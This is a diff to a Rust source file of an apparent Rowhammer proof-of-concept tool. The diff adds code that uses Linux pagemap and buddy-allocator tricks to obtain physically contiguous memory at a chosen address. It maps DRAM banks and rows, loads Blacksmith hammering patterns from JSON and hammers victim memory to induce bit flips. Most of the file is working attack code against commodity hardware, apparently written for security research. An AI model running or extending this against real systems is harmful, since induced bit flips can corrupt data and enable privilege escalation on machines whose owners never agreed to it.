@@ -8,12 +8,19 @@ use std::{
         Arc,
     },
     thread,
+    time::Duration,
 };
 
 use anyhow::{bail, Context};
-use bs_poc::memory::{LinuxPageMap, VirtToPhysResolver};
+use bs_poc::{
+    forge::{load_pattern_from_json, Hammerer, Hammering, PatternAddressMapper},
+    jitter::AggressorPtr,
+    memory::{DRAMAddr, LinuxPageMap, PreAllocatedVictimMemory, VirtToPhysResolver},
+    util::{BlacksmithConfig, MemConfiguration},
+    victim::HammerVictimMemCheck,
+};
 use clap::Parser;
-use libc::{MAP_ANONYMOUS, MAP_POPULATE, MAP_PRIVATE, PROT_READ, PROT_WRITE};
+use libc::{c_void, MAP_ANONYMOUS, MAP_POPULATE, MAP_PRIVATE, PROT_READ, PROT_WRITE};
 use log::{debug, error, info};
 use proc_getter::buddyinfo::*;
 use std::fs::File;
@@ -25,6 +32,18 @@ struct CliArgs {
     ///The bait-alloc mode.
     #[clap(long = "mode", default_value = "bait")]
     mode: BaitMode,
+    ///The BlacksmithConfig
+    #[clap(long = "config")]
+    config: String,
+    /// The JSON file containing hammering patterns to load
+    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
+    load_json: String,
+    /// The pattern ID to load from the JSON file
+    #[clap(long = "pattern")]
+    pattern: String,
+    /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
+    #[clap(long = "mapping")]
+    mapping: Option<String>,
 }
 
 #[derive(clap::ValueEnum, Clone, Debug)]
@@ -34,8 +53,6 @@ enum BaitMode {
     Prey,
 }
 
-const PAGE_COUNT: usize = 1000;
-const RELEASE_COUNT: usize = 500;
 const PREY_PAGE_COUNT: usize = 500;
 const PAGE_LEN: usize = 4 * KB;
 
@@ -108,9 +125,9 @@ fn diff_arrs<const S: usize>(l: &[usize; S], r: &[usize; S]) -> [i64; S] {
     diffs
 }
 
-unsafe fn mmap_block(len: usize) -> *mut libc::c_void {
+unsafe fn mmap_block(addr: *mut c_void, len: usize) -> *mut libc::c_void {
     let v = libc::mmap(
-        null_mut(),
+        addr,
         len,
         PROT_READ | PROT_WRITE,
         MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
@@ -194,7 +211,7 @@ unsafe fn mmap_consecutive_2mb_block() -> anyhow::Result<*mut libc::c_void> {
 }
 
 #[cfg(feature = "buddyinfo")]
-unsafe fn mmap_consecutive_2mb_block() -> anyhow::Result<*mut libc::c_void> {
+unsafe fn mmap_consecutive_2mb_block(base_msb: AggressorPtr) -> anyhow::Result<*mut libc::c_void> {
     fn is_block10_candidate(diff: &[i64; 11]) -> bool {
         if diff[10] != 1 {
             return false;
@@ -214,7 +231,7 @@ unsafe fn mmap_consecutive_2mb_block() -> anyhow::Result<*mut libc::c_void> {
     let mut file = File::create("dmesg.log")?;
     // Write an empty string to the file.
     write!(file, "")?;
-    let v = mmap_block(hugeblock_len);
+    let v = mmap_block(null_mut(), hugeblock_len);
     debug!("1 GB allocated");
     let mut pages = [null_mut(); 50000];
     let mut v1 = None;
@@ -222,7 +239,7 @@ unsafe fn mmap_consecutive_2mb_block() -> anyhow::Result<*mut libc::c_void> {
     for i in 0..50000 {
         log_pagetypeinfo();
         let blocks_before = get_normal_page_nums()?;
-        let v = mmap_block(2 * MB);
+        let v = mmap_block(base_msb as *mut c_void, 2 * MB);
         log_pagetypeinfo();
         let blocks_after = get_normal_page_nums()?;
         diff = diff_arrs(&blocks_before, &blocks_after);
@@ -234,7 +251,13 @@ unsafe fn mmap_consecutive_2mb_block() -> anyhow::Result<*mut libc::c_void> {
             v1 = Some(v);
             break;
         } else {
+            // make place for the next allocation at base_msb. Releasing and then allocating the same block will probably lead
+            // to the allocation being reused, so we should be fine. We do this to ensure that our final allocation
+            // will be mapped to `base_msb`, which is needed for virt-to-phys mapping.
+            libc::munmap(v, 2 * MB);
+            let v = mmap_block(null_mut(), 2 * MB);
             pages[i] = v;
+            info!("Moved dummy allocation to {:?}", v);
         }
     }
     assert_ne!(diff[10], 0);
@@ -286,30 +309,61 @@ unsafe fn mode_monitor_buddyinfo() -> anyhow::Result<()> {
     }
 }
 
-// next: spezifischen speicherbereich unterschieben
-unsafe fn mode_bait(mut resolver: LinuxPageMap) -> anyhow::Result<()> {
-    //let mut virt = vec![0_u64; 1 << 30];
-    //let mut phys = vec![0_u64; 1 << 30];
+fn find_mapping_base(
+    mapping: PatternAddressMapper,
+    mem_config: MemConfiguration,
+    base_msb: *const u8,
+) -> *const u8 {
+    let addr = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
+    addr.to_virt(base_msb, mem_config)
+}
 
-    //mmap_page_buddy()?;
-    //drain_small_pages(2 * MB)?;
-    let mut successes = 0;
+unsafe fn mode_bait(args: CliArgs, mut resolver: LinuxPageMap) -> anyhow::Result<()> {
+    let config = BlacksmithConfig::from_jsonfile(&args.config).with_context(|| "from_jsonfile")?;
+    let mem_config =
+        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
 
-    for retries in 0..usize::MAX {
-        /*log_pagetypeinfo();
-        let prog = prog().expect("prog");
-        let child = Command::new(prog)
-            .stdout(Stdio::piped())
-            .args(["--mode", "prey"])
-            .spawn()?;*/
-        let v = mmap_consecutive_2mb_block()?;
+    const BASE_MSB: *const u8 = 0x2000000000 as *const u8;
+
+    // load patterns from JSON
+    let pattern = load_pattern_from_json(args.load_json.clone(), args.pattern.clone())?;
+    let mapping = match &args.mapping {
+        Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
+        None => pattern
+            .determine_most_effective_mapping()
+            .expect("pattern contains no mapping"),
+    };
+
+    info!("Using mapping {:?}", mapping);
+
+    // find offset from base and mapping start
+    let mapping_base = find_mapping_base(mapping.clone(), mem_config, BASE_MSB as *const u8);
+    let mapping_end = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0)
+        .to_virt(BASE_MSB as *const u8, mem_config);
+    let num_rows = mapping_end as usize - mapping_base as usize + 1;
+    //let flip_aggr_offset = find_flip_aggr_offset(mapping.clone(), mem_config)?;
+    info!("base_msb: {:?}", BASE_MSB as *const u8);
+    info!("determined mapping base as {:?}", mapping_base);
+    info!("mapping length: {}", num_rows);
+    //info!("determined flip aggr offset as {}", flip_aggr_offset);
+
+    loop {
+        //log_pagetypeinfo();
+        //let prog = prog().expect("prog");
+        //let child = Command::new(prog)
+        //    .stdout(Stdio::piped())
+        //    .args(["--mode", "prey"])
+        //    .spawn()?;
+        let v = mmap_consecutive_2mb_block(mapping_base)?;
+
+        let addr1 = DRAMAddr::from_virt(v as *const u8, &mem_config);
         let consecs = get_consec_pfns(&mut resolver, v);
         let success = match &consecs {
             Ok(consecs) => {
                 info!("PFNs {:?}", consecs);
                 let first_block_bytes = (consecs[1] - consecs[0]) as usize;
                 info!(
-                    "Allocated a consecutive {} KB block at 0x{:x}",
+                    "Allocated a consecutive {} KB block at {:#02x}",
                     first_block_bytes / 1024,
                     v as u64
                 );
@@ -320,22 +374,59 @@ unsafe fn mode_bait(mut resolver: LinuxPageMap) -> anyhow::Result<()> {
                 false
             }
         };
-        libc::munmap(v, 2 * MB);
-        if success {
-            successes += 1;
+        if !success {
+            thread::sleep(Duration::from_secs(2));
+            continue;
         }
+        // We assume we have successfully allocated a consecutive 1 MB block
+        let v = v as AggressorPtr;
+        let mapping_min = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
+        let mapping_max = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0);
         info!(
-            "Success rate (>= 1 MB): {}/{}: {:.02}",
-            successes,
-            retries + 1,
-            successes as f32 / (retries + 1) as f32,
+            "mapping range: [{:?}, {:?}], [{:?}, {:?}]",
+            mapping_min,
+            mapping_max,
+            mapping_min.to_virt(BASE_MSB, mem_config),
+            mapping_max.to_virt(BASE_MSB, mem_config)
         );
+        for page_offset in 0..(1 * MB / PAGE_LEN) {
+            let addr =
+                DRAMAddr::from_virt((v as AggressorPtr).add(page_offset * PAGE_LEN), &mem_config);
+            info!("page {}: {:?}", page_offset, addr);
+        }
+
+        //mapping.adapt_for_consec(v as AggressorPtr, mem_config);
+
+        for (aggr, addr) in &mapping.aggressor_to_addr {
+            info!(
+                "{:?}: {:?}, {:?}",
+                aggr,
+                addr,
+                addr.to_virt(BASE_MSB as AggressorPtr, mem_config)
+            );
+        }
+
+        let hammerer = Hammerer::new(
+            mem_config,
+            pattern.clone(),
+            mapping.clone(),
+            BASE_MSB as AggressorPtr,
+        )?;
+        let memory = PreAllocatedVictimMemory::new(v as *mut u8, 1 * MB)?;
+        let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);
+
+        let res = hammerer.hammer(&mut victim);
+        print!("{:?}", res);
+
         // signal child process
-        /*signal("INT", child.id())?;
-        let output = child.wait_with_output().expect("child wait");*/
-        thread::sleep(std::time::Duration::from_secs(2));
+        //signal("INT", child.id())?;
+        //let _output = child.wait_with_output().expect("child wait");
+        //thread::sleep(std::time::Duration::from_secs(2));
+
+        // cleanup
+        libc::munmap(v as *mut c_void, 2 * MB);
+        return Ok(());
     }
-    Ok(())
 }
 
 // TODO entweder malloc arena vergiften oder viel speicher alloziieren und wenig freigeben
@@ -395,7 +486,7 @@ unsafe fn _main() -> anyhow::Result<()> {
     let resolver = LinuxPageMap::new()?;
 
     match args.mode {
-        BaitMode::Bait => mode_bait(resolver),
+        BaitMode::Bait => mode_bait(args, resolver),
         BaitMode::Prey => mode_prey(resolver),
         BaitMode::MonitorBuddyInfo => mode_monitor_buddyinfo(),
     }
